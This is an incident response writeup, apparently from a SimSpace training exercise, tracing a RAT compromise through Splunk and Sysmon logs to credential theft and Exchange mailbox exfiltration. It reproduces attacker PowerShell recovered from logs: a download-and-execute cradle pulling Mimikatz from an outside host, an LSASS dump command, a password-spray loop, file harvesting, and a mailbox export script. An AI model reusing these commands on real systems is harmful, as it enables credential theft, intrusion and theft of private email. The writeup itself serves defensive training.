# Incident Response: RAT Compromise & Exchange Exfiltration
### SimSpace LiveFire Exercise — April 2, 2026

> On April 2nd, our team participated in a live incident response exercise on SimSpace — a platform we are building out for cyber training and CCDC lab development. This writeup documents the full investigation conducted in real time using Splunk, covering everything from initial detection through credential theft, lateral movement, persistence, and confirmed email exfiltration.

---

## Context

| | |
|---|---|
| **Exercise** | SimSpace LiveFire — IR Scenario |
| **Date** | April 2, 2026 |
| **Window** | 8:00 AM – 10:00 AM EST (user activity), 10:00 AM+ IR |
| **Detection Source** | Splunk proxy logs — anomalous outbound HTTP |
| **Patient Zero** | `172.16.4.101` — Charley Fritz workstation |
| **Hosts Compromised** | 3 confirmed |
| **Severity** | 🔴 Critical |

---

## Attack Overview

A workstation was compromised via a custom RAT (`procduwp.exe`) dropped in `C:\Users\Public\`. The malware established C2 communications with a South Korean server, downloaded Mimikatz in memory, sprayed passwords to pivot to a second machine, installed SSH backdoors, and exfiltrated a user's Exchange mailbox — all within 15 minutes of the user logging in.

---

## Attack Chain

```
[8:00 AM]  Charley Fritz logs in → workstation 172.16.4.101
              │
              ▼
[8:55 AM]  procduwp.exe executes from C:\Users\Public\
              │
              ├─► Beacons to estonine.com every ~20s (port 80)
              ├─► Registers: GET /register/br-win10-1/windows
              └─► Receives ~10KB command payloads each cycle
              │
              ▼
[8:59 AM]  Password spray → \\dev-win10-2
              │
              ├─► 100 random passwords attempted via net use
              ├─► Fallback: hardcoded Simspace1!Simspace1!
              └─► SUCCESS at 8:59:29 AM
              │
              ▼
[9:00 AM]  Fileless Mimikatz
              │
              ├─► Downloads mimi.txt from simonxu.cc (3.5MB)
              ├─► Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
              └─► ALL domain credentials stolen from LSASS
              │
              ▼
[9:01 AM]  eml.log read via cmd.exe → powershell
              │
              ▼
[9:02 AM]  Security logs cleared — Event ID 1102
              │
              ▼
[9:03 AM]  Lateral movement → br-win10-1 (Event ID 4648)
              │
              ├─► 5 backdoor accounts created
              └─► SSH installed (sshd service account)
              │
              ▼
[9:04 AM]  dev-win10-2 (172.16.5.102) registers with C2
              │
              ▼
[9:09 AM]  Exchange mailbox exfiltrated
              │
              └─► jefferson.livingston → \\mailserver\C$\backup.pst
              │
              ▼
[9:11 AM]  Both hosts beaconing simultaneously
              │
              ▼
[10:00 AM] User activity paused — IR initiated
              │
              ▼
[12:46 PM] out.txt opened via Notepad on br-win10-1
           ⚠️  Possible active attacker access via SSH post-containment
```

---

## Investigation

### 1. Initial Detection

The first anomaly was caught in Splunk proxy logs — a workstation making repeated HTTP GET requests to an unknown external domain over plain HTTP on port 80.

```spl
index=* src_ip="172.16.4.101" | table _time, src_ip, dest_ip, url, bytes_out | sort _time
```

**First log caught:**
```
src_ip=172.16.4.101  dest_ip=211.56.98.146  dest_port=80
url=http://estonine.com/update/4
bytes_out=10779  status=200
local_time=[02/Apr/2026:09:01:31 -0400]
```

A GET to an `/update/` endpoint over unencrypted HTTP returning ~10KB was immediately suspicious. Pivoting on the IP confirmed South Korean origin.

---

### 2. Confirming C2 Beaconing

```spl
index=* url="*estonine*" | table _time, src_ip, dest_ip, url, bytes_out | sort _time
```

Requests came in every ~20 seconds — textbook automated beaconing. The URL pattern told the full story:

| URL | Meaning |
|---|---|
| `/register/br-win10-1/windows` | Machine registration with C2 |
| `/register/dev-win10-2/windows` | Second machine infected |
| `/update` | Heartbeat check (305 bytes) |
| `/update/3`, `/update/4`, `/update/5` | Command retrieval (~10.9KB) |

---

### 3. Finding the Malware

```spl
index="windows" host="br-win10-1" powershell earliest=-4h
```

Sysmon logs revealed the binary and its execution chain:

```
C:\Users\Public\procduwp.exe  [created 8:55 AM]
  └─► cmd.exe /c powershell gc C:\Windows\Tasks\eml.log; echo "success"
        └─► ParentImage: C:\Users\Public\procduwp.exe
              User: site\charley.fritz
```

**File artifacts:**

| File | Timestamp | Purpose |
|---|---|---|
| `C:\Users\Public\procduwp.exe` | 8:55 AM | Malware binary |
| `C:\Users\Public\out` | 8:59 AM | Credential dump / recon output |
| `C:\Windows\Tasks\eml.log` | — | Email log staged for exfiltration |

**Hashes:**
```
MD5:    8A2122E8162DBEF04694B9C3E0B6CDEE
SHA256: B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450
```

---

### 4. Fileless Mimikatz via PowerShell Cradle

At 9:00 AM, the malware downloaded and executed Mimikatz directly in memory — no file written to disk:

```powershell
# Captured in PowerShell script block logs on br-win10-1:
(New-Object System.Net.WebClient).DownloadString(
  "http://proxy.east2south.simonxu.cc/mimi.txt"
) | IEX

Invoke-Mimikatz -Command "'sekurlsa::logonpasswords'"
```

Confirmed via proxy logs:
```spl
index=* url="*simonxu*" OR url="*mimi.txt*" | stats count by src_ip
```

```
src_ip=172.16.4.101  dest_ip=104.250.191.110  port=80
url=http://proxy.east2south.simonxu.cc/mimi.txt
bytes_out=3,625,385  status=200
```

3.5MB downloaded successfully. Every credential cached in LSASS on that host — plaintext passwords, NTLM hashes, Kerberos tickets — was extracted and sent back to the C2.

---

### 5. Password Spray Against dev-win10-2

```spl
index="windows" "C:\\Users\\Public\\out" | table _time, host, CommandLine | sort _time
```

A spray script ran before Mimikatz — brute forcing the second machine while waiting for credentials:

```powershell
# Reconstructed from Sysmon process logs:
$hit = $false; $count = 0
while (!$hit -and $count -lt 100) {
    $p = -join ((33..126) | Get-Random -C 12 | % {[char]$_})
    if ($(net use \\dev-win10-2 /user:administrator "$p" 2>$null)) {
        $hit = $true
        sc -path c:\users\public\out.txt -value "$p"
    }
    if (!$hit) {
        $p = 'Simspace1!Simspace1!'   # hardcoded fallback
        if ($(net use \\dev-win10-2 /user:administrator "$p" 2>$null)) {
            $hit = $true
            sc -path c:\users\public\out.txt -value "$p"
        }
    }
}
```

The hardcoded password succeeded at **8:59:29 AM**. This credential was known to the attacker before deployment — suggesting prior reconnaissance or a previous breach.

---

### 6. Anti-Forensics — Log Clearing

```spl
index=* EventCode=1102 earliest="04/02/2026:00:00:00" | table _time, host, user
```

At 9:02:45 AM, the Windows Security event log was wiped using the Administrator account:

```
Event ID: 1102 — Audit log cleared
Account Name: Administrator
Domain: site
Logon ID: 0xBC070F9
Logged: 4/2/2026 9:02:45 AM
```

This destroyed evidence of initial access and privilege escalation prior to that timestamp.

---

### 7. Lateral Movement

```spl
index=* EventCode=4648 earliest="04/02/2026:00:00:00" | table _time, host, AccountName
```

At 9:03:29 AM, explicit credentials were used to authenticate to `br-win10-1.site.lan`:

```
Event ID: 4648 — Logon using explicit credentials
Computer: br-win10-1.site.lan
Task Category: Logon
```

---

### 8. Persistence — Backdoor Accounts + SSH

```spl
index=* EventCode=4720 earliest="04/02/2026:00:00:00" | table _time, host, AccountName, SubjectUserName
```

Five accounts created on `br-win10-1`:

| Account | Purpose |
|---|---|
| `b-admin0` | Backdoor local admin |
| `i-admin0` | Backdoor local admin |
| `o-admin0` | Backdoor local admin |
| `r-admin0` | Backdoor local admin |
| `sshd` | SSH service — encrypted persistent shell |

SSH on a Windows host is highly anomalous. It provides an encrypted backdoor that survives reboots and bypasses RDP monitoring — confirmed still active at 12:46 PM when `out.txt` was opened via Notepad post-containment.

---

### 9. File Harvesting

A PowerShell script enumerated all sensitive files across user profiles:

```powershell
# Captured in Sysmon logs:
$files = @()
gci C:\Users -exclude "Public" | gci -Recurse -exclude "AppData" `
  -include "*.txt","*.csv","*.dat" -file 2>$null |
  foreach { $files = $files + $_.FullName }
$file = [System.Convert]::ToBase64String(
  [System.Text.Encoding]::UTF8.GetBytes($files)
) | Get-Random
echo $file
```

This built a complete map of sensitive files across all infected hosts and Base64-encoded the list for C2 transmission.

---

### 10. Exchange Mailbox Exfiltration

The most critical finding — a full Exchange mailbox exported using Exchange PowerShell remoting:

```powershell
# Decoded from Base64-encoded PowerShell host application log:
$password = ConvertTo-SecureString 'Simspace1!Simspace1!' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential (
  'administrator@site', $password
)
$mailserver = [Net.DNS]::GetHostByAddress(
  [Net.DNS]::GetHostEntry('Autodiscover').AddressList[0]
).Hostname
$fp = "\\$mailserver\C$\backup.pst"
$Session = New-PSSession -ConfigurationName Microsoft.Exchange `
  -ConnectionUri http://$mailserver/PowerShell/ `
  -Authentication Kerberos -Credential $Credential
Import-PSSession $Session -DisableNameChecking -AllowClobber
New-ManagementRoleAssignment -Role 'Mailbox Import Export' `
  -User 'Administrator' -ErrorAction SilentlyContinue
New-MailboxExportRequest -Mailbox jefferson.livingston -FilePath $fp
```

The attacker granted themselves Mailbox Import Export rights and exported `jefferson.livingston`'s full mailbox to `\\mailserver\C$\backup.pst`.

---

## MITRE ATT&CK Mapping

| Technique | ID | How We Observed It |
|---|---|---|
| Valid Accounts | T1078 | Hardcoded `Simspace1!Simspace1!` used throughout |
| Brute Force — Password Spraying | T1110.003 | `net use` spray loop against `dev-win10-2` |
| PowerShell | T1059.001 | All attacker actions via PS cradles |
| OS Credential Dumping — LSASS | T1003.001 | Mimikatz `sekurlsa::logonpasswords` |
| Ingress Tool Transfer | T1105 | `mimi.txt` downloaded from `simonxu.cc` |
| Remote Services — SMB | T1021.002 | `net use` lateral movement |
| Create Account — Local Account | T1136.001 | b-admin0, i-admin0, o-admin0, r-admin0 |
| Account Manipulation | T1098 | New-ManagementRoleAssignment on Exchange |
| Remote Services — SSH | T1021.004 | `sshd` installed on Windows host |
| File and Directory Discovery | T1083 | Recursive `gci` across all user profiles |
| Email Collection | T1114 | Exchange mailbox exported to PST |
| Exfiltration Over C2 Channel | T1041 | Data sent back via HTTP beaconing |
| Indicator Removal — Clear Logs | T1070.001 | Event ID 1102 at 9:02 AM |
| Obfuscated Files — Base64 | T1027 | PowerShell commands Base64-encoded |

---

## Indicators of Compromise

### Network

| Type | Value | Notes |
|---|---|---|
| IP | `211.56.98.146` | Primary C2 — South Korea |
| IP | `104.250.191.110` | Mimikatz delivery server |
| Domain | `estonine.com` | C2 domain |
| Domain | `proxy.east2south.simonxu.cc` | Mimikatz host |
| URL | `http://estonine.com/update` | Heartbeat |
| URL | `http://estonine.com/update/[3-5]` | Command retrieval |
| URL | `http://estonine.com/register/{hostname}/windows` | Machine registration |
| URL | `http://proxy.east2south.simonxu.cc/mimi.txt` | Mimikatz payload |

### Host

| Type | Value | Notes |
|---|---|---|
| File | `C:\Users\Public\procduwp.exe` | Malware binary |
| File | `C:\Users\Public\out.txt` | Credential dump output |
| File | `C:\Windows\Tasks\eml.log` | Staged email data |
| File | `\\mailserver\C$\backup.pst` | Exfiltrated mailbox |
| MD5 | `8A2122E8162DBEF04694B9C3E0B6CDEE` | procduwp.exe |
| SHA256 | `B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450` | procduwp.exe |
| Credential | `administrator@site` / `Simspace1!Simspace1!` | Hardcoded in malware |
| Accounts | `b-admin0`, `i-admin0`, `o-admin0`, `r-admin0`, `sshd` | Backdoor accounts |

### Windows Event IDs

| Event ID | Meaning | When |
|---|---|---|
| `1102` | Security log cleared | 9:02:45 AM |
| `4648` | Explicit credential logon | 9:03:29 AM |
| `4720` | User account created | ~9:04 AM |
| `4732` | User added to admin group | ~9:04 AM |
| `7045` | New service installed (sshd) | ~9:04 AM |

---

## Splunk Queries Used

```spl
# Initial detection — all traffic from patient zero
index=* src_ip="172.16.4.101" | table _time, src_ip, dest_ip, url, bytes_out | sort _time

# Confirm C2 beaconing
index=* url="*estonine*" | table _time, src_ip, dest_ip, url, bytes_out | sort _time

# Find all machines that registered with C2
index=* url="*estonine*/register*" | table _time, src_ip, url | sort _time

# PowerShell activity on compromised host
index="windows" host="br-win10-1" powershell earliest=-4h

# Mimikatz download confirmation
index=* url="*simonxu*" OR url="*mimi.txt*" | stats count by src_ip

# Password spray evidence
index="windows" "C:\\Users\\Public\\out" | table _time, host, CommandLine | sort _time

# Log clearing events across all hosts
index=* EventCode=1102 earliest="04/02/2026:00:00:00" | table _time, host, user

# Lateral movement via explicit credentials
index=* EventCode=4648 earliest="04/02/2026:00:00:00" | table _time, host, AccountName

# Backdoor account creation
index=* EventCode=4720 earliest="04/02/2026:00:00:00" | table _time, host, AccountName, SubjectUserName

# Check for activity after user pause (ongoing access detection)
index=* src_ip="172.16.4.101" earliest="04/02/2026:10:00:00" | sort _time

# Check all machines that hit C2 after pause
index=* dest_ip="211.56.98.146" earliest="04/02/2026:10:00:00" | stats count by src_ip, _time | sort _time

# Data exfiltration volume by destination
index=* (src_ip="172.16.4.101" OR src_ip="172.16.5.102") earliest="04/02/2026:08:55:00" | stats sum(bytes_out) as total_bytes by dest_ip | sort -total_bytes

# Exchange exfiltration search
index="windows" "MailboxExportRequest" earliest="04/02/2026:00:00:00" | table _time, host, Message, CommandLine | sort _time
```

---

## Root Cause

The compromise was made possible by several control failures:

- **Hardcoded credentials** — `Simspace1!Simspace1!` embedded in malware suggests prior knowledge of domain credentials
- **No account lockout policy** — password spray of 100+ attempts went unblocked
- **No MFA** on administrative accounts or remote access
- **LSASS unprotected** — Mimikatz extracted credentials without restriction (no Credential Guard)
- **Unrestricted PowerShell** — no Constrained Language Mode or AMSI blocking
- **C:\Users\Public writable** — malware staged freely in a world-writable directory
- **Exchange over-permissioned** — attacker self-granted Mailbox Import Export role without alerting

---

## Recommendations

**Immediate:**
- Reset all domain passwords — Mimikatz ran with full LSASS access
- Disable the `administrator@site` account — password is burned
- Delete backdoor accounts: `b-admin0`, `i-admin0`, `o-admin0`, `r-admin0`
- Remove SSH from `br-win10-1` and disable `sshd` service
- Block at firewall: `211.56.98.146`, `104.250.191.110`
- Block at DNS/proxy: `estonine.com`, `simonxu.cc`

**Short-term:**
- Enforce MFA for all privileged accounts and remote access
- Enable Credential Guard to protect LSASS from Mimikatz
- Implement PowerShell Constrained Language Mode + Script Block Logging
- Set account lockout after 5 failed attempts
- Alert on Event IDs: `1102`, `4648`, `4720`, `7045`, `4732`
- Audit Exchange for unauthorized Mailbox Import Export role assignments

**Long-term:**
- Investigate how attacker obtained `Simspace1!Simspace1!` before deployment
- Deploy EDR with memory protection and LSASS tamper detection
- Implement network segmentation between `172.16.4.0/24` and `172.16.5.0/24`
- Enable tamper-proof SIEM log forwarding so Event ID 1102 can't hide the past

---

## Tools & Environment

| Tool | Purpose |
|---|---|
| **Splunk** | Primary SIEM — all log search and correlation |
| **Sysmon** | Process creation, network connections, file events |
| **Windows Event Logs** | Security, PowerShell, System |
| **Squid Proxy Logs** | Outbound HTTP visibility |
| **SimSpace** | Lab environment platform |

---

## Files in This Repo

| File | Description |
|---|---|
| `README.md` | This document — full investigation walkthrough |
| `splunk-queries.md` | All Splunk queries used, organized by phase |
| `iocs.md` | Complete IOC list — network, host, credentials, events |
| `IR-2026-0402-Incident-Report.pdf` | Formal IR report |

---

*April 2, 2026 — SimSpace LiveFire IR Exercise*
